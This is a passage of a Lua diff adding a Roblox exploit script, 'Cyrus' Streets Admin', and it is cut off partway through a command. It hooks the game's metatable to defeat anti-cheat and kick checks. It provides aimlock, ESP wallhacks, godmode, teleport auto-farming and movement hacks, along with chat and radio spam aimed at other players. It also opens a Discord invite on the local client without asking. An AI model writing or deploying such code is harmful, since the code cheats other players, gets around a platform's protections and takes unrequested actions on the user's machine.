+  Url = "http://127.0.0.1:6463/rpc?v=1",
+  Method = "POST",
+  Headers = {["Content-Type"] = "application/json",["Origin"] = "https://discord.com"},
+        Body = HttpService:JSONEncode({
+            cmd = "INVITE_BROWSER",
+            args = {
+                code = "5uZtux2QKe"
+            },
+            nonce = HttpService:GenerateGUID(false)
+        }),
+    })
+
+if pcall(readfile,"CyrusStreetsAdminSettings") then
+    writefile("CyrusStreetsAdminSettings.json",readfile("CyrusStreetsAdminSettings"))
+        if delfile then
+                 delfile("CyrusStreetsAdminSettings")
+        end
+end 
+local Tick = tick()
+getgenv().Players = game:GetService'Players'
+getgenv().TeleportService = game:GetService'TeleportService'
+getgenv().ReplicatedStorage = game:GetService'ReplicatedStorage' 
+getgenv().StarterGui = game:GetService'StarterGui'
+getgenv().TweenService = game:GetService'TweenService'
+getgenv().UserInput = game:GetService'UserInputService'
+getgenv().RunService = game:GetService'RunService'
+getgenv().Lighting = game:GetService'Lighting'
+getgenv().CoreGui = game:GetService'CoreGui'
+getgenv().HttpService = game:GetService'HttpService'
+getgenv().MarketplaceService = game:GetService'MarketplaceService'
+getgenv().LP = Players.LocalPlayer or Players.PlayerAdded:Wait()
+getgenv().Mouse = LP:GetMouse()
+getgenv().GetChar = function() return LP.Character or LP.CharacterAdded:Wait() end
+GetChar():WaitForChild('Humanoid',10) -- allows auto-execution
+local PlayerTable,Commands,KeyTable,UrlEncoder,AdminUsers,DontStompWhitelisted = {},{},{['w'] = false;['a'] = false;['s'] = false;['d'] = false;['Shift'] = false;['Control'] = false;},{['0'] = "%30";['1'] = "%31";['2'] = "%32";['3'] = "%33"; ['4'] = "%34";['5'] = "%35";['6'] = "%36";['7'] = "%37";['8'] = "%38";['9'] = "%39";[' '] = "%20";},{},{}
+local NormalWS,NormalJP,NormalHH = GetChar().Humanoid.WalkSpeed,GetChar().Humanoid.JumpPower,GetChar().Humanoid.HipHeight
+local AimLock,GodMode,AutoDie,AliasesEnabled,Noclipping,AutoFarm,ItemEsp,WalkShoot,flying,AutoStomp,Freecam,CamLocking,FeLoop,TpBypass,HealBot = false,false,false,true,false,false,false,false,false,false,false,false,false,false,false
+local BlinkSpeed,SpawnWS,SpawnJP,SpawnHH,ClockTime,PlayOnDeath,AimlockTarget,CamlockPlayer,LoopPlayer
+local AirWalk = Instance.new'Part'
+local Cframe = Instance.new("Frame",CoreGui.RobloxGui)
+local CText,CmdFrame,MainFrame,DmgIndicator = Instance.new("TextBox",Cframe),Instance.new("Frame",Cframe),Instance.new('Frame',CoreGui.RobloxGui),Instance.new('TextLabel',LP.PlayerGui.Chat.Frame)
+local ScrollingFrame,SearchBar,Credits = Instance.new('ScrollingFrame',MainFrame),Instance.new('TextBox',MainFrame),Instance.new('TextLabel',MainFrame)
+local BulletColour,ItemEspColour,EspColour = ColorSequence.new(Color3.fromRGB(218, 133, 65)),Color3.fromRGB(200,200,200),Color3.fromRGB(218, 133, 65)
+local UseDraw,DrawingT = pcall(assert,Drawing,'test')
+local ShiftSpeed,ControlSpeed,WalkSpeed,HealBotHealth,BlinkSpeed,AimbotVelocity = 25,8,16,25,1,5
+local OldFov = workspace.CurrentCamera.FieldOfView
+local Config = "CyrusStreetsAdminSettings"
+local TargetPart,AimlockMode = "Prediction","LeftClick"
+Players:Chat("")
+Players:Chat("")
+local RobloxInForeground = true 
+local DrawTable = {
+        ['LineColour'] = Color3.fromRGB(218, 133, 65);
+        ['Thickness'] = 1;
+        ['Transparency'] = 1;
+        ['Visible'] = true;
+}
 
 
+if workspace:FindFirstChild'Armoured Truck' then
+        PartTable = {
+                ['Burger'] = workspace:WaitForChild'Burger | $15';
+                ['Drink'] = workspace:WaitForChild'Drink | $15';
+                ['Ammo'] = workspace:WaitForChild'Buy Ammo | $25';
+                ['Pipe'] = workspace:WaitForChild'Pipe | $100';
+                ['Machete'] = workspace:WaitForChild'Machete | $70';
+                ['SawedOff'] = workspace:WaitForChild'Sawed Off | $150';
+                ['Spray'] = workspace:WaitForChild'Spray | $20';
+                ['Uzi'] = workspace:WaitForChild'Uzi | $150';
+                ['Glock'] = workspace:WaitForChild'Glock | $200';
+        }
+    workspace["Armoured Truck"]:Destroy()
+elseif workspace:FindFirstChild'TPer' then 
+    workspace['TPer']:Destroy()
+end
+
+LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
+LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y)
+--^ Ty to Jayy#0648 for this "Hack" for bringing back normal chat 
+
+local SettingsTable = {
+   Keys = {};
+   ClickTpKey = "";
+   ShiftSpeed = 25;
+   ControlSpeed = 8;
+   TargetPart = "Prediction";
+   AimlockMode = "LeftClick";
+   BlinkMode = "Shift";
+   AimbotVelocity = 10;
+}
+
+-- Hotkey start
+
+local function savesettings()
+        writefile(Config..".json",HttpService:JSONEncode(SettingsTable))
+    local SettingsToSave = HttpService:JSONDecode(readfile(Config..".json"))
+    Keys = SettingsToSave.Keys;
+        ClickTpKey = SettingsToSave.ClickTpKey;
+        ShiftSpeed = SettingsToSave.ShiftSpeed;
+        ControlSpeed = SettingsToSave.ControlSpeed;
+        TargetPart = SettingsToSave.TargetPart;
+        AimlockMode = SettingsToSave.AimlockMode;
+        BlinkMode = SettingsToSave.BlinkMode;
+        AimbotVelocity = SettingsToSave.AimbotVelocity;
+end 
+
+getgenv().updateSettings = function()
+    local New = { 
+        Keys = Keys;
+                ClickTpKey = ClickTpKey;
+                ShiftSpeed = ShiftSpeed;
+                ControlSpeed = ControlSpeed;
+                TargetPart = TargetPart;
+                AimlockMode = AimlockMode;
+                BlinkMode = BlinkMode;
+                AimbotVelocity = AimbotVelocity;
+    }
+    writefile(Config..".json",HttpService:JSONEncode(New))
+end
+
+local function runsettings()
+        local SettingsToRun = HttpService:JSONDecode(readfile(Config..".json"))
+    Keys = SettingsToRun.Keys
+        ClickTpKey = SettingsToRun.ClickTpKey
+        BlinkMode = SettingsToRun.BlinkMode
+        if SettingsToRun.AimlockMode then 
+                AimlockMode = SettingsToRun.AimlockMode
+        end
+        if SettingsToRun.TargetPart then 
+                TargetPart = SettingsToRun.TargetPart
+        end
+        if SettingsToRun.ShiftSpeed and SettingsToRun.ControlSpeed then 
+                ShiftSpeed = SettingsToRun.ShiftSpeed;
+                ControlSpeed = SettingsToRun.ControlSpeed;
+        end 
+        if SettingsToRun.AimbotVelocity then 
+                AimbotVelocity = SettingsToRun.AimbotVelocity
+        end
+end
+
+if readfile and writefile then 
+        local Work,Error = pcall(readfile,Config..".json")
+        if not Work then 
+                local Work,Error = pcall(savesettings)
+                if not Work then 
+                        print'Error with saving settings' 
+                end 
+        else
+                local Work,Error = pcall(runsettings)
+                if not Work then 
+                        print'Error with running settings'
+                end 
+        end
+end 
+
+-- Hotkey end 
+
+-- Bypass Start
+
+local gamememe = getrawmetatable(game)
+local Closure,Caller = newcclosure,checkcaller or is_protosmasher_caller or Cer.isCerus
+local writeable = setreadonly or make_writeable
+local callingscript = getcallingscript or get_calling_script
+local name,index,nindex = gamememe.__namecall,gamememe.__index,gamememe.__newindex
+writeable(gamememe,false)
+
+gamememe.__index = Closure(function(self,Index)
+        if TpBypass and callingscript and callingscript() ~= script and Index == "HumanoidRootPart" then -- was requested to add this
+                return index(self,"Torso")
+        end 
+        return index(self,Index)
+end)
+
+gamememe.__newindex = Closure(function(self,Property,b)
+if Caller() then return nindex(self,Property,b) end
+        if self:IsA'Humanoid' then 
+        game:GetService'StarterGui':SetCore('ResetButtonCallback',true)
+                if Property == "WalkSpeed" then
+                        if WalkShoot then 
+                                return
+                        end
+                end
+                if Property == "Health" or Property == "JumpPower" or Property == "HipHeight"  then 
+                        return 
+                end
+        end
+        if Property == "CFrame" and self:IsDescendantOf(LP.Character) then
+                return 
+        end
+        return nindex(self,Property,b)
+end)
+
+gamememe.__namecall = Closure(function(self,...)
+local Arguments = {...}
+        if Caller() then 
+                if getnamecallmethod() == "FindFirstChild" then
+                        if Arguments[1] == "RealHumanoidRootPart" then 
+                                Arguments[1] = "HumanoidRootPart" 
+                                return name(self,unpack(Arguments))
+                        end
+                end
+                return name(self,...) 
+        end 
+                if getnamecallmethod() == "Destroy" and tostring(self) == "BodyGyro" or getnamecallmethod() == "Destroy" and tostring(self) == "BodyVelocity" then
+                        return wait(9e9)
+                end
+                if getnamecallmethod() == "BreakJoints" and self.Name == LP.Character.Name then
+                        return wait(9e9)
+                end
+                if getnamecallmethod() == "Kick" or getnamecallmethod() == "Destroy" and tostring(self) == tostring(LP) then 
+                        return
+                end
+                if getnamecallmethod() == "WaitForChild" or getnamecallmethod() == "FindFirstChild" then 
+                        if callingscript and callingscript() ~= script and TpBypass and Arguments[1] == "HumanoidRootPart" then
+                                Arguments[1] = "Torso"
+                                return name(self,unpack(Arguments))
+                        end
+                end
+                if getnamecallmethod() == "FireServer" then
+                                if self.Name == "lIII" or tostring(self.Parent) == "ReplicatedStorage" then 
+                                        return wait(9e9)
+                                end
+                                if Arguments[1] == "hey" then 
+                                        return wait(9e9)
+                                end
+                                if Arguments[1] == "play" then
+                                        local TempTable = {}
+                                        tostring(Arguments[2]):gsub('.',function(Char)
+                                                        if UrlEncoder[Char] then 
+                                                                table.insert(TempTable,UrlEncoder[Char])
+                                                        else 
+                                                        table.insert(TempTable,Char)
+                                                end
+                                        end)
+                                        Arguments[2] = table.concat(TempTable,"")
+                                        PlayOnDeath = Arguments[2]
+                                        return name(self,unpack(Arguments))
+                                end
+                if Arguments[1] == "stop" then 
+                        PlayOnDeath = nil 
+                end
+        end
+        if LP.Character.FindFirstChildOfClass(LP.Character,"Tool") and typeof(Arguments[1]) == "CFrame" then
+                if AimlockTarget and AimLock then
+                        if TargetPart == "Prediction" then
+                                if AimlockTarget.FindFirstChild(AimlockTarget,"HumanoidRootPart") then
+                                        return name(self,AimlockTarget.Torso.CFrame + AimlockTarget.HumanoidRootPart.Velocity / AimbotVelocity)
+                                else 
+                                        return name(self,AimlockTarget.Torso.CFrame + AimlockTarget.Torso.Velocity / AimbotVelocity)
+                                end 
+                        else
+                                if AimlockTarget.FindFirstChild(AimlockTarget,TargetPart) then 
+                                        return name(self,AimlockTarget[TargetPart].CFrame) 
+                                else
+                                        notif(tostring(AimlockTarget).." doesn't have that part in their character.","I recommend switching to something else.",5,nil)
+                                end
+                        end
+                end
+        end 
+    return name(self,...)
+end)
+
+writeable(gamememe,true)
+-- Bypass End
+
+getgenv().notif = function(title,message,length,icon)
+        StarterGui:SetCore("SendNotification",{['Title'] = title;['Text'] = message;['Duration'] = length;['Icon'] = icon;})
+end
+
+getgenv().Teleport = function(Part)
+if not typeof(Part) == "CFrame" then return end
+local PartFound = GetChar():FindFirstChild'HumanoidRootPart' or GetChar():FindFirstChild'Torso'
+        if not GetChar():FindFirstChild'HumanoidRootPart' then 
+                PartFound.CFrame = Part
+        else
+                local Play = TweenService:Create(PartFound, TweenInfo.new(3.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),{CFrame = Part})
+                Play:play()
+        end
+end
+
+local function hasItem(Player,Item)
+    if type(Item) == "boolean" then
+        local Tool = Player.Character:FindFirstChildOfClass'Tool'
+        if Tool then 
+            return Tool.Name
+        else
+            return 'none'
+        end
+    end
+    if Player.Backpack:FindFirstChild(Item) or Player.Character:FindFirstChild(Item) then
+        return 'yes' 
+    else
+        return 'no'
+    end
+end 
+
+local function checkHp(Plr)
+        return Plr:FindFirstChildOfClass'Humanoid' and Plr.Humanoid.Health or "No Humanoid"
+end
+
+local function LegacyEsp(Player)
+if not Player.Character or not Player.Character:FindFirstChild'Head' then return end 
+        local Esp1 = Instance.new("BillboardGui",Player.Character)
+        local Text = Instance.new("TextLabel",Esp1)
+        Esp1.Adornee = Player.Character.Head
+        Esp1.Name = "[ESP]"..Player.Name
+        Esp1.Size = UDim2.new(0,100,0,100)
+        Esp1.StudsOffset = Vector3.new(0,1,0)
+        Esp1.AlwaysOnTop = true
+        Text.BackgroundTransparency = 1
+        Text.Position = UDim2.new(0,0,0,0)
+        Text.Size = UDim2.new(1,0,0,40)
+        Text.TextStrokeTransparency = 0.5
+        Text.TextSize = 25
+        local PCChild = Player.Character:GetChildren()
+        RunService.Stepped:Connect(function()
+                if Player and Player.Character and Player.Character:FindFirstChild'Head' and GetChar():FindFirstChild'Head' then 
+                        Text.Text = Player.Name.." Position: "..math.floor((GetChar().Head.Position - Player.Character.Head.Position).magnitude)
+                        Text.TextStrokeColor3 = EspColour
+                        Text.TextColor3 = EspColour
+                end
+        end)
+        return Esp1
+end 
+
+local EspTable = {} 
+local function espPlayer(Player,Method,IsUser)
+if not Player.Character or not Player.Character:FindFirstChild'Head' then return end
+if not IsUser then IsUser = "GLOCKY USER X CY" else IsUser = "GLOCKY USER X" end 
+if table.find(AdminUsers,Player.UserId) then IsUser = "GLOCKY USER X " end 
+        if not UseDraw or Method == "Legacy" then
+                local Esp1 = LegacyEsp(Player)
+                local CAdded;
+                CAdded = Player.CharacterAdded:Connect(function(C)
+                        if table.find(EspTable,Player.UserId) then 
+                                C:WaitForChild('Head',10)
+                                Esp1 = LegacyEsp(Player)
+                        else 
+                                CAdded:Disconnect()
+                        end
+                end)
+        else 
+                local TopLeft,TopRight,BottomLeft,BottomRight = Drawing.new'Line',Drawing.new'Line',Drawing.new'Line',Drawing.new'Line'
+                local Text = Drawing.new'Text'
+                TopLeft.Color = Color3.fromRGB(218, 133, 65)
+                TopRight.Color = Color3.fromRGB(218, 133, 65)
+                BottomLeft.Color = Color3.fromRGB(218, 133, 65)
+                BottomRight.Color = Color3.fromRGB(218, 133, 65)
+                local Tracer = Drawing.new'Line'
+                PlayerTable[#PlayerTable + 1] = {Player,TopLeft,TopRight,BottomLeft,BottomRight,Text,Tracer,IsUser}
+        end 
+end
+
+local function Unesp(P)
+        for i = 1,#PlayerTable do
+                if PlayerTable[i] and PlayerTable[i][1] == P then
+                        PlayerTable[i][2]:Remove()
+                        PlayerTable[i][3]:Remove()
+                        PlayerTable[i][4]:Remove()
+                        PlayerTable[i][5]:Remove()
+                        PlayerTable[i][6]:Remove()
+                        PlayerTable[i][7]:Remove()
+                        PlayerTable[i][8] = nil 
+                        table.remove(PlayerTable,i)
+                end 
+        end
+end 
+
+local function GrabThing(Thing,OldPos)
+if not PartTable then 
+        notif("Can't tp to "..Thing,"as you are not playing normal streets!",5,"rbxassetid://1281284684") return 
+end
+local PartFound = GetChar():FindFirstChild'HumanoidRootPart' or GetChar():FindFirstChild'Torso'
+local Anim = Instance.new'Animation'
+Anim.AnimationId = "rbxassetid://188632011"
+local Track = GetChar().Humanoid:LoadAnimation(Anim)
+PartFound.CFrame = PartFound.CFrame * CFrame.new(math.random(20,45),0,math.random(1,5))
+wait()
+        repeat  
+                Track:play(.1,1,1)
+                PartFound.CFrame = PartTable[Thing]:FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,0.5,0)
+                RunService.Heartbeat:wait()
+        until PartTable[Thing]:FindFirstChildOfClass'Part'.BrickColor == BrickColor.new'Bright red' or GetChar():FindFirstChild'KO' or GetChar().Humanoid.Health == 0
+        PartFound.CFrame = OldPos
+        return true
+end 
+
+local function Button1Down()
+local MTarget = Mouse.Target
+        if GetChar():FindFirstChild'Zetox Btools' then 
+                Mouse.Target:Destroy()
+        end
+        if MTarget and MTarget.Parent then 
+                local NTarget = MTarget.Parent 
+                if not Players:GetPlayerFromCharacter(NTarget) then NTarget = NTarget.Parent end 
+                if not Players:GetPlayerFromCharacter(NTarget) then return end 
+                if NTarget ~= LP.Character and NTarget ~= AimlockTarget and AimLock and AimlockMode == "LeftClick" then 
+                        AimlockTarget = NTarget
+                        local Connection;
+                        Connection = Players:GetPlayerFromCharacter(NTarget).CharacterAdded:Connect(function(C)
+                                if tostring(AimlockTarget) == tostring(C) then 
+                                        AimlockTarget = C 
+                                else
+                                        Connection:Disconnect()
+                                end 
+                        end)
+                        notif("AimlockTarget has been set to",AimlockTarget.Name,5,nil)
+                end
+        end
+end
+
+local function BehindAWall(Target)
+        local RYEBread = Ray.new(workspace.CurrentCamera.CoordinateFrame.p,Target.Head.Position - workspace.CurrentCamera.CoordinateFrame.Position)
+        local RYEBreadHit = workspace:FindPartOnRay(RYEBread)
+        if RYEBreadHit then 
+                if RYEBreadHit:IsDescendantOf(Target) then 
+                        return false
+                else
+                        return true 
+                end 
+        end 
+end
+
+local function closestToMouse()
+local ClosestPos,ClosestPlayer = math.huge,nil
+        for i,v in pairs(Players:GetPlayers()) do 
+                if v.Character and v.Character:FindFirstChild'Head' and v ~= LP then 
+                        local Dist = (v.Character.Head.Position - workspace.CurrentCamera.CoordinateFrame.Position).magnitude
+                        local RYETarget = Ray.new(workspace.CurrentCamera.CoordinateFrame.Position,(Mouse.Hit.p - workspace.CurrentCamera.CoordinateFrame.Position)).unit
+                        local RYEHit,RYEPos = workspace:FindPartOnRay(RYETarget,workspace)
+                        local NewPos = math.floor((RYEPos - v.Character.Head.Position).magnitude)
+                        if NewPos < 500 and NewPos < ClosestPos and not BehindAWall(v.Character) then
+                                ClosestPos = NewPos
+                                ClosestPlayer = v 
+                        end
+                end
+        end
+        return ClosestPlayer
+end
+
+local function Button2Down()
+if Mouse.Target then 
+        local Target = Mouse.Target.Parent 
+        if Target:FindFirstChild'Lock' and Target:FindFirstChild'Click' and Target:FindFirstChild'Locker' then 
+                if Target.Locker.Value then 
+                                Target.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
+                                Target.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
+                        else
+                                Target.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
+                                Target.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
+                        end
+                end
+        end
+        if AimLock and AimlockMode == "RightClick" and KeyTable['Shift'] then 
+                AimlockTarget = closestToMouse().Character
+                local Connection;
+                Connection = Players:GetPlayerFromCharacter(AimlockTarget).CharacterAdded:Connect(function(C)
+                        if tostring(AimlockTarget) == tostring(C) then 
+                                AimlockTarget = C 
+                        else
+                                Connection:Disconnect()
+                        end 
+                end)
+                notif("AimlockTarget","has been set to"..AimlockTarget.Name,5,nil)
+        end 
+end
+
+local function FreeCam(Speed)
+if not GetChar():FindFirstChild'Head' then return end 
+        if workspace:FindFirstChild'FreecamPart' then 
+                workspace.FreecamPart:Destroy()
+        end
+        Speed = Speed or 35
+        GetChar().Head.Anchored = true 
+        local FreecamPart = Instance.new('Part',workspace)
+        FreecamPart.Name = "FreecamPart"
+        FreecamPart.Position = GetChar().Head.Position + Vector3.new(0,5,0)
+        FreecamPart.Transparency = 1
+        FreecamPart.CanCollide = false
+        FreecamPart.Anchored = true
+        workspace.CurrentCamera.CameraSubject = FreecamPart
+        repeat wait()
+                local Pos = Vector3.new()
+                local Look = (workspace.CurrentCamera.Focus.p - workspace.CurrentCamera.CoordinateFrame.p).unit
+                local PartPos = FreecamPart.Position
+                if KeyTable['w'] then
+                        Pos = Pos + Vector3.new(0,0,-1)
+                elseif KeyTable['a'] then
+                        Pos = Pos + Vector3.new(-1,0,0)
+                elseif KeyTable['s'] then
+                        Pos = Pos + Vector3.new(0,0,1)
+                elseif KeyTable['d'] then
+                        Pos = Pos + Vector3.new(1,0,0)
+                elseif KeyTable['Space'] then
+                        Pos = Pos + Vector3.new(0,1,0)
+                elseif KeyTable['Control'] then
+                        Pos = Pos + Vector3.new(0,-1,0)
+                end 
+                FreecamPart.CFrame = CFrame.new(PartPos,PartPos + Look) * CFrame.new(Pos * Speed)
+        until not Freecam or GetChar().Humanoid.Health == 0
+        workspace.CurrentCamera.CameraSubject = GetChar()
+        GetChar().Head.Anchored = false 
+        if workspace:FindFirstChild'FreecamPart' then 
+                workspace.FreecamPart:Destroy()
+        end
+end
+
+local function b(Text)
+        DmgIndicator.Visible = true 
+        DmgIndicator.Text = Text
+        wait(5)
+        DmgIndicator.Text = "" 
+        DmgIndicator.Visible = false 
+end 
+
+local function Char(Plr)
+local Tool = Plr:FindFirstChildOfClass'Tool'
+        if Tool:FindFirstChild'Fire' then 
+                return 'beamed u fucking win sped',Tool
+        else 
+                return 'hit you',Tool
+        end
+end 
+
+getgenv().AddCommand = function(CommandF,Name,Alias,Help)
+        Commands[#Commands + 1] = {['Function'] = CommandF,['Name'] = Name,['Alias'] = Alias,['Help'] = Help}
+end
+getgenv().FindCommand = function(Command)
+        for i = 1,#Commands do 
+                if Commands[i].Name:lower() == Command or AliasesEnabled and table.find(Commands[i].Alias,Command) then
+                        return Help and Commands[i].Name.." "..Commands[i].Help or Commands[i].Function
+                end
+        end
+end
+
+getgenv().CheckCommand = function(Chat)
+        Chat = string.gsub(Chat, "\r", "")
+        local Arguments = string.split(Chat," ")
+        local NCommand = FindCommand(table.remove(Arguments,1):lower())
+        if NCommand then 
+                local Work,Error = pcall(NCommand,Arguments)
+                if not Work then 
+                        wait(0.5)
+                        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("сознание#8340 if you find a bug","All")
+                        if setclipboard then 
+                                setclipboard(Error)
+                        else 
+                                print(Error)
+                        end
+                end
+        end
+end
+
+getgenv().PlrFinder = function(Plr)
+local NewPlr,Player = Plr:lower(),Players:GetPlayers()
+if #NewPlr == 2 and NewPlr == "me" then return LP end 
+if NewPlr == "all" then return Player end 
+        for i = 1,#Player do 
+                if Player[i].Name:lower():sub(1,#NewPlr) == NewPlr then 
+                        return Player[i]
+                end
+        end
+end
+
+local JustDoubleJumped = false 
+local function HumanoidState(Old,New)
+        if New == Enum.HumanoidStateType.Landed and JustDoubleJumped then 
+                local Anim = Instance.new'Animation'
+                Anim.AnimationId = "rbxassetid://129423030" 
+                local AnimTrack = GetChar().Humanoid:LoadAnimation(Anim)
+                wait(0.3)
+                AnimTrack:play()
+                JustDoubleJumped = false
+        elseif New == Enum.HumanoidStateType.FallingDown or New == Enum.HumanoidStateType.PlatformStanding and NoGh or flying then
+        GetChar().Humanoid.PlatformStand = false
+                GetChar().Humanoid:ChangeState(8)
+        end
+end
+
+local function DoubleJump()
+        if GetChar() and GetChar().Humanoid and DoubleJumpEnabled then
+            GetChar().Humanoid:ChangeState(3)
+            local Anim = Instance.new'Animation'
+            Anim.AnimationId = "rbxassetid://229782914"
+            local AnimTrack = GetChar().Humanoid:LoadAnimation(Anim)
+            AnimTrack:play(.1,1,1.5)
+                JustDoubleJumped = true
+        end
+end
+
+getgenv().find = function(Item)
+  for i,v in pairs(workspace:GetChildren()) do 
+      if v.Name == "RandomSpawner" and v:FindFirstChild'Model' then
+      local Handle = v.Model.Handle
+        if Item == "Cash" and Handle:FindFirstChildOfClass'MeshPart' and string.find(Handle:FindFirstChildOfClass'MeshPart'.MeshId,"511726060") then
+          return v
+        elseif Item == "Shotty" and Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"142383762") then 
+          return v
+        elseif Item == "Sawed Off" and Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"219397110") then 
+          return v 
+        elseif Item == "Uzi" and Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"328964620") then 
+          return v 
+        elseif Item == "All" then 
+          return v
+      end
+    end
+  end
+end
+
+local function uselessfunction(Thing)
+local Model = Thing:WaitForChild('Model',10)
+if Model then 
+        local Handle = Thing.Model.Handle
+                if Handle:FindFirstChildOfClass'MeshPart' and string.find(Handle:FindFirstChildOfClass'MeshPart'.MeshId,"511726060") then
+                        return "Cash"
+                elseif Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"142383762") then 
+                        return "Shotty"
+                elseif Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"219397110") then 
+                        return "Sawed Off"
+                elseif Handle:FindFirstChild'Fire' and string.find(Handle.Fire.SoundId,"328964620") then 
+                        return "Uzi"
+                elseif Handle:FindFirstChild'Blade' and string.find(Handle.Blade.TextureID,"12177251") then 
+                        return "Katana"
+                end
+        end
+end
+
+local function addBillBoardGui(Item)
+        local Itemx = uselessfunction(Item)
+        if not Itemx then return end 
+        local Esp1 = Instance.new("BillboardGui",Item)
+        local Text = Instance.new("TextLabel",Esp1)
+        Esp1.Adornee = Item
+        Esp1.Size = UDim2.new(0,100,0,100)
+        Esp1.StudsOffset = Vector3.new(0,1,0)
+        Esp1.AlwaysOnTop = true
+        Text.BackgroundTransparency = 1
+        Text.Position = UDim2.new(0,0,0,0)
+        Text.Size = UDim2.new(1,0,0,40)
+        Text.TextColor3 = ItemEspColour
+        Text.TextStrokeTransparency = 0.5
+        Text.TextSize = 15
+        Text.TextStrokeColor3 = ItemEspColour
+        Text.Text = Itemx
+end     
+
+workspace.ChildAdded:Connect(function(Part)
+        if Part.Name == "RandomSpawner" then
+                if AutoFarm then 
+                        farm("Cash")
+                end
+                if ItemEsp then 
+                        addBillBoardGui(Part)
+                end
+        end
+end)
+
+
+getgenv().farm = function(Item)
+  for i,v in pairs(workspace:GetChildren()) do 
+        if v.Name == "RandomSpawner" then 
+                if find(Item) and type(find(Item)) == "userdata" then 
+                        Teleport(find(Item).CFrame)
+                        wait(3)
+                else 
+                        notif("Farm "..Item,"None of "..Item.." on the map",5,"rbxassetid://1281284684")
+                        break;
+                end
+      end
+   end
+end
+
+AddCommand(function()
+        AliasesEnabled = not AliasesEnabled
+        notif("AliasesEnabled","Has been set to "..tostring(AliasesEnabled),5,nil) 
+end,"usealias",{},"Turns on / off Aliases")
+
+AddCommand(function(Arguments)
+        if not Arguments[1] then 
+                MainFrame.Visible = not MainFrame.Visible
+        end
+end,"help",{"commands","cmds"},"Gives you the commands help info")
+
+AddCommand(function()
+        local Btool = Instance.new('Tool',LP.Backpack)
+        Btool.Name = "Zetox Btools" 
+end,"btools",{},"Gives you Btools")
+
+AddCommand(function()
+        local Children = LP.PlayerGui.HUD:GetChildren()
+        for i = 1,#Children do
+                if Children[i]:IsA'Frame' then 
+                        Children[i].Active = not Children[i].Active 
+                        Children[i].Draggable = not Children[i].Draggable
+                end
+        end
+end,"draggablegui",{},"Makes the HP/KO/Stamina bar draggable")
+
+AddCommand(function()
+        NoGh = not NoGh
+        notif("Nogh","Has been set to "..tostring(NoGh),5,nil) 
+end,"nogroundhit",{"nogh","antigh","antigroundhit"},"Makes it so you can't be ground hit")
+
+AddCommand(function(Arguments)
+        if not Arguments[1] then 
+                GodMode = not GodMode
+                GetChar():BreakJoints()
+        end
+end,"godmode",{"god"},"Gods your player (Breaks tools)")
+
+AddCommand(function(Arguments)
+        local Tool = GetChar():FindFirstChildOfClass'Tool'
+    if Tool then
+        Tool.Parent = LP.Backpack
+        Tool.Grip = CFrame.new(Arguments[1] or 0,Arguments[2] or 0,Arguments[3] or 0) + Vector3.new(Arguments[4] or 0,Arguments[5] or 0,Arguments[6] or 0)
+        Tool.Parent = GetChar()
+    else 
+        notif("NO TOOLS","ONE TOOL IS NEEDED",5,nil)
+    end
+end,"grippos",{"grip"},"[1 2 3 4 5 6] - changes grip pos to the arguments you set (First 3 are CFrame,last 3 are Vector)")
+
+AddCommand(function(Arguments)
+local GDesc = game:GetDescendants()
+        for i = 1,Arguments[1] or 50 do 
+                for i = 1,#GDesc do 
+                        if GDesc[i]:IsA'Tool' and GDesc[i]:FindFirstChild'Click' then 
+                                GDesc[i].Click:FireServer()
+                                wait()
+                        end
+                end
+        end
+end,"spamclick",{},"spams the Click remote and makes annoying sounds")
+
+AddCommand(function()
+local WChild = workspace:GetChildren()
+        for i = 1,#WChild do 
+                if WChild[i].Name == "Door" and WChild[i]:FindFirstChild'Click' and WChild[i]:FindFirstChild'Lock' then
+                        WChild[i].Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
+                        WChild[i].Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
+                        wait()
+                end
+        end
+end,"doors",{},"locks/unlocks doors")
+
+local SpamDelay,SpamMessage,Spamming = 1,"Cyrus' Admin Or No Admin",false 
+AddCommand(function(Arguments)
+        if Arguments[1] then 
+                SpamMessage = table.concat(Arguments," ")
+        end 
+        Spamming = not Spamming 
+end,"spam",{},"Spams a message you set")
+
+AddCommand(function(Arguments)
+        SpamDelay = Arguments[1] or 1 
+end,"spamdelay",{},"Delays the spam for [amount] Default: 1 second")
+
+AddCommand(function()
+local GDesc = game:GetDescendants()
+        for i = 1,10 do 
+                for i = 1,#GDesc do 
+                        if GDesc[i]:IsA'Tool' and GDesc[i]:FindFirstChild'Click' then 
+                                GDesc[i].Click:FireServer()
+                        end
+                end
+        end
+end,"muteallradios",{"muteradios"},"Mutes all radios (does not loop)")
+
+AddCommand(function(Arguments)
+        if Arguments[1] then 
+                Normalwalk = true
+                WalkShoot = true 
+                GetChar().Humanoid.WalkSpeed = Arguments[1]
+                WalkSpeed = Arguments[1]
+        end
+end,"speed",{"ws"},"Changes your Humanoids WalkSpeed")
+
+AddCommand(function()
+        WalkShoot = not WalkShoot
+end,"walkshoot",{"noslow"},"Allows you to turn on / off walk shooting")
+
+AddCommand(function(Arguments)
+        Normalwalk = false
+        ControlSpeed = Arguments[1]
+        updateSettings()
+end,"crouchspeed",{"cspeed"},"Changes your Crouching speed")
+
+AddCommand(function(Arguments)
+        Normalwalk = false
+        ShiftSpeed = Arguments[1]
+        updateSettings()
+end,"sprintspeed",{"sspeed"},"Changes your sprinting speed")
+
+AddCommand(function(Arguments)
+        GetChar().Humanoid.HipHeight = Arguments[1]
+end,"hipheight",{"hh"},"Changes your Humanoids HipHeight")
+
+AddCommand(function(Arguments)
+        GetChar().Humanoid.JumpPower = Arguments[1]
